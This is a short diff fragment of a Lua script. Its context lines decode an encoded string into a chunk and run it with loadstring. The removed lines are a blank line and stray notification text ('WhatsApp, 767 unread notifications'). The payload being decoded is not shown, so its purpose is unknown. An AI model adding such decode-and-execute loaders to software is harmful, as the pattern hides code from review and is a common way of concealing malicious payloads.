@@ -592,5 +592,3 @@ for i=1,#s,2 do
 end
 local f = loadstring(table.concat(d))
 if f then f() end
-
-WhatsApp, 767 unread notifications
